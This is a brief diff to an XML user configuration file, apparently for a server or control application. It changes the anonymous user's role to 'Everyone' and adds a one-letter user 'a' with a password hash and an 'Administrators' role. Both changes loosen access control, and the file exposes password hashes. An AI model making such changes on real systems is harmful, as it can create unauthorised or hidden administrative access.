@@ -4,7 +4,7 @@
   <Element ID="Anonymous" Type="User">
     <Property ID="UserID" Value="1" />
     <Group ID="Roles">
-      <Property ID="Role[1]" Value="Anonymous" />
+      <Property ID="Role[1]" Value="Everyone" />
     </Group>
   </Element>
   <Element ID="Operator" Type="User">
@@ -19,6 +19,13 @@
     <Property ID="Password" Value="eWgPhGa0ln3imvQi2Ho3zdLAmYnr+Fahqj5wNxyV3oofYb0rvu8=" />
     <Group ID="Roles">
       <Property ID="Role[1]" Value="Administrator" />
+    </Group>
+  </Element>
+  <Element ID="a" Type="User">
+    <Property ID="UserID" Value="4" />
+    <Property ID="Password" Value="Ac6kMSrS7d6Aaw196odIcTlO557IZj2XINnUL/gxzHx2ebWdScs=" />
+    <Group ID="Roles">
+      <Property ID="Role[1]" Value="Administrators" />
     </Group>
   </Element>
 </Configuration>
